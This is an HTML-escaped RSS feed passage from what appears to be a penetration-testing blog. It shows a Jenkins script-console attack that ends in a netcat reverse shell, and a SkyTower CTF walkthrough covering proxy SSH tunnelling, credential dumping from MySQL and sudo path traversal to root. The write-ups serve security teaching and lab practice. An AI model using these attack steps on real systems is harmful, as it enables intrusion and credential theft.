   &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

   &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Process exit code: ${proc.exitValue()}&quot;&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Std Err: ${proc.err.text}&quot;&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Std Out: ${proc.in.text}&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Jenkins requires /tmp to have exec perms&lt;/h5&gt;
  &lt;p&gt;By default Jenkins requires &lt;code&gt;/tmp&lt;/code&gt; to have the execute mount option set, so you should be safe to land shells there on Jenkins servers.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;groovy-script-execute-shell-command&quot;&gt;groovy script execute shell command&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;perl /tmp/shell&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;              

    &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Process exit code: ${proc.exitValue()}&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Std Err: ${proc.err.text}&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Std Out: ${proc.in.text}&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;execute-the-groovy-scripts-via-scripttext-jenkins-api&quot;&gt;Execute the Groovy Scripts via scriptText Jenkins API&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;script=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&amp;lt;./wget.groovy&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://192.168.30.130:8080/scriptText
curl &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;script=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&amp;lt;./execute.groovy&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://192.168.30.130:8080/scriptText&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;get-shell&quot;&gt;Get Shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~/pwn-jenkins]# nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443
    listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
    connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.30.128] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.30.130] 42340
     21:16:17 up 15:17,  1 user,  load average: 0.23, 0.31, 0.17
     USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
     root     tty1     -                05:59    3:40   0.12s  0.12s &lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt;
     Linux localhost.localdomain 2.6.32-573.3.1.el6.x86_64 &lt;span class=&quot;c&quot;&gt;#1 SMP Thu Aug 13 22:55:16 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;498&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;499&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;499&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;unconfined_u:system_r:unconfined_java_t:s0
     /
     apache: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Invalid argument
     apache: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
     apache-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
     whoami
     &lt;/span&gt;jenkins
     apache-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
     id
     &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;498&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;499&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;499&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;unconfined_u:system_r:unconfined_java_t:s0
     apache-4.1&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Jenkins Does Not Consider this a Vulnerability&lt;/h5&gt;
  &lt;p&gt;Dispite the fact the web application is insecure by default (the default
  install leaves the API and webapp exposed without authentication), Jenkins do
  not consider this a vulnerability. Your best option is to configure
  authentication by following the &lt;a href=&quot;https://wiki.jenkins-ci.org/display/JENKINS/Standard+Security+Setup&quot;&gt;Securing Jenkinsi Guide&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;more-info-about-jenkins&quot;&gt;More info about Jenkins&lt;/h2&gt;

&lt;p&gt;Jenkins is a tool consisting of a master and a slave, the master server
schedules and runs jobs for the jenkins slaves to execute. The default
installation configures the master as a slave server, allowing anyone with access to the Jenkins master
to execute arbitrary code on the master (via the slave).&lt;/p&gt;

&lt;p&gt;A more secure solution would be isolating the role of the master server.
Currently if a Jenkins master server is compromised, it’s likely an attacker
will also be able to execute jobs / run shell scripts on the Jenkins slaves.&lt;/p&gt;

&lt;p&gt;An additional ACL option within Matrix-based security to disable API, and
another for script
console / execution on the Jenkins Master would be a good idea. Currently the
only options is to disable all script access for the user/group, which appears to include the
slaves.&lt;/p&gt;

&lt;p&gt;Be mindful of the fact that, by giving access to the slaves via the Jenkins Master,
you’re essentially giving the user shell level access to the slave (or at least
the ability to execute shell commands on the slave machine).&lt;/p&gt;

&lt;h2 id=&quot;more-resources&quot;&gt;More Resources&lt;/h2&gt;

&lt;p&gt;More links about this vuln and similar Jenkins vulns below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/&quot;&gt;http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>SkyTower - Walkthrough</title>
          <link>https://highon.coffee/blog/skytower-walkthrough/</link>
          <pubDate>Mon, 20 Jul 2015 15:00:59 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/skytower-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-analysis&quot; id=&quot;markdown-toc-web-application-analysis&quot;&gt;Web Application Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#http-proxy-ssh-connection&quot; id=&quot;markdown-toc-http-proxy-ssh-connection&quot;&gt;HTTP Proxy SSH Connection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mysql-credentials&quot; id=&quot;markdown-toc-mysql-credentials&quot;&gt;MySQL Credentials&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation---password-reuse&quot; id=&quot;markdown-toc-privilege-escalation---password-reuse&quot;&gt;Privilege Escalation - Password Reuse&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#getting-root&quot; id=&quot;markdown-toc-getting-root&quot;&gt;Getting root:&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot; id=&quot;markdown-toc-conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the “flag”.&lt;/p&gt;

&lt;p&gt;You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Telspace Systems&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 10.0.1.114&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.22 ((Debian))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;td&gt;
            &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 3128&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
        &lt;/td&gt;
        &lt;td&gt;
            &lt;pc&gt;&lt;p&gt;http-proxy&lt;/p&gt;&lt;/pc&gt;
        &lt;/td&gt;
        &lt;td&gt;
            &lt;pc&gt;&lt;p&gt;Squid http proxy 3.1.20&lt;/p&gt;&lt;/pc&gt;
        &lt;/td&gt;
     &amp;lt;/tr&amp;gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-analysis&quot;&gt;Web Application Analysis&lt;/h2&gt;

&lt;p&gt;The basic test below indicated the web application could be vulnerable to SQL injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/skytower/sqli-test.png&quot; alt=&quot;SQLi Test&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SQL Injection looked possible + DB identified as MySQL:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/skytower/sqli-error.png&quot; alt=&quot;MySQL error&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumeration indicated the web application was filtering the SQLi attempts and removing some characters, such as &lt;code&gt;OR&lt;/code&gt;. This was overcome (after researching for SQLi filtering evasion) using the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/skytower/burp-sqli-evasion.png&quot; alt=&quot;Burp SQLi Evasion&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With no direct access to SSH the above credentials could not be leveraged to gain a Shell.&lt;/p&gt;

&lt;h2 id=&quot;http-proxy-ssh-connection&quot;&gt;HTTP Proxy SSH Connection&lt;/h2&gt;

&lt;p&gt;The following was used to gain access to the SSH server by proxying the connection through the open &lt;strong&gt;SQUID&lt;/strong&gt; server on the target machine.&lt;/p&gt;

&lt;p&gt;Setup tunnel with proxytunnel:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# proxytunnel &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 10.0.1.114:3128 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 127.0.0.1:22 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 4444&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;SSH through the HTTP tunnel:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ssh john@127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444  &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
john@127.0.0.1&lt;span class=&quot;s1&quot;&gt;'s password:

id
uid=1000(john) gid=1000(john) groups=1000(john)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;/bin/sh&lt;/code&gt; needed to be postfixed to the end of the SSH command, as the server appeared to kick connections upon connection.&lt;/p&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;Enumeration as the user John discovered the MySQL root credentials:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;login.php
&amp;lt;?php

&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new mysqli&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'SkyTech'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;mysql-credentials&quot;&gt;MySQL Credentials&lt;/h2&gt;

&lt;p&gt;The following process was used to disclosed the users credentials:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
Enter password: root
show databases&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;
Database
information_schema
SkyTech
mysql
performance_schema
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; SkyTech
Enter password: root
show tables&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;
Tables_in_SkyTech
login



mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; SkyTech
Enter password: rootroot
ERROR 1045 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Access denied &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using password: YES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; SkyTech
Enter password: root
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from login&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;id    &lt;/span&gt;email    password
1    john@skytech.com    hereisjohn
2    sara@skytech.com    ihatethisjob
3    william@skytech.com    senseable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;privilege-escalation---password-reuse&quot;&gt;Privilege Escalation - Password Reuse&lt;/h2&gt;

&lt;p&gt;Password reuse for the user &lt;code&gt;sara&lt;/code&gt; was possible using the previously discovered credentials.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ssh sara@127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
sara@127.0.0.1&lt;span class=&quot;s1&quot;&gt;'s password:
$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The user &lt;strong&gt;sara&lt;/strong&gt; had sudo access to the binary &lt;code&gt;/bin/cat&lt;/code&gt;, path traversal was used to cat the contents of &lt;code&gt;/root/flag.txt&lt;/code&gt; which contained the root password.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;getting-root&quot;&gt;Getting root:&lt;/h3&gt;

&lt;p&gt;With the previously discovered credentials it was possible to &lt;code&gt;su -&lt;/code&gt; to root:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
Password:
root@SkyTower:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@SkyTower:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
root@SkyTower:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I enjoyed the SQL injection filtering evasion, overall a short CTF that can easily be done in an evening.&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Zorz Walkthrough</title>
          <link>https://highon.coffee/blog/zorz-walkthrough/</link>
          <pubDate>Wed, 01 Jul 2015 00:00:00 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/zorz-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#level-1&quot; id=&quot;markdown-toc-level-1&quot;&gt;Level 1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#level-2&quot; id=&quot;markdown-toc-level-2&quot;&gt;Level 2&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#burp-suite---php-shell-injection-in-an-image-file&quot; id=&quot;markdown-toc-burp-suite---php-shell-injection-in-an-image-file&quot;&gt;Burp Suite - PHP Shell Injection in an Image file&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell:&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#level-3&quot; id=&quot;markdown-toc-level-3&quot;&gt;Level 3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#flag&quot; id=&quot;markdown-toc-flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;Welcome to the ZorZ VM Challenge&lt;/p&gt;

